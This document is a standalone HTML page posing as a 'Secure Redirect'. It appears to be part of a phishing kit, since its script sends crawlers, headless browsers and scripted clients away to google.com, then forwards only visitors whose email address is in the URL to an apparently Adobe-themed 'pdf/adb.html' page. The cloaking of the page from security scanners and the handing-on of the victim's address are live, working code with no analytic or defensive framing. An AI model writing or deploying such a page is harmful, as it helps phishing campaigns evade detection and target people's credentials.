<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <title>Secure Redirect</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #1a202c;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
    }
    .container {
      text-align: center;
      max-width: 500px;
      padding: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #4a6cf7;
    }
    .status {
      background: #2d3748;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: 14px;
    }
    .loader {
      border: 3px solid #2d3748;
      border-top: 3px solid #4a6cf7;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Secure Redirect</h1>
    <div class="status" id="status">Initializing security protocols...</div>
    <div class="loader"></div>
  </div>

  <script>
    (function () {
      const status = document.getElementById('status');
      
      // Bot detection
      const botPatterns = [
        /HeadlessChrome/i, /PhantomJS/i, /bot/i, /spider/i, 
        /crawl/i, /curl/i, /wget/i, /python-requests/i,
        /java/i, /php/i, /ruby/i, /go-http/i, /node-fetch/i
      ];
      
      const isBot = (
        window.outerWidth === 0 ||
        window.outerHeight === 0 ||
        navigator.webdriver ||
        botPatterns.some(pattern => pattern.test(navigator.userAgent))
      );
      
      if (isBot) {
        window.location.href = "https://google.com";
        return;
      }
      
      // Check for email in hash
      const hash = window.location.hash.substring(1);
      if (!hash || !hash.includes("@")) {
        window.location.href = "https://google.com";
        return;
      }
      
      const email = hash;
      
      // Generate secure token
      function generateSecureToken(length = 64) {
        const array = new Uint8Array(length / 2);
        window.crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
      }
      
      const token = generateSecureToken();
      
      // Encode data
      function encodeData(data) {
        return btoa(encodeURIComponent(data))
          .replace(/\+/g, '-')
          .replace(/\//g, '_')
          .replace(/=+$/, '');
      }
      
      // Store in sessionStorage
      sessionStorage.setItem("redirect_email", email);
      sessionStorage.setItem("redirect_token", token);
      
      // Clean URL
      history.replaceState(null, "", window.location.pathname + window.location.search);
      
      // Prepare redirect
      const encodedEmail = encodeData(email);
      const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
      
      // Immediate redirect
      window.location.href = redirectUrl;
    })();
  </script>
</body>
</html>
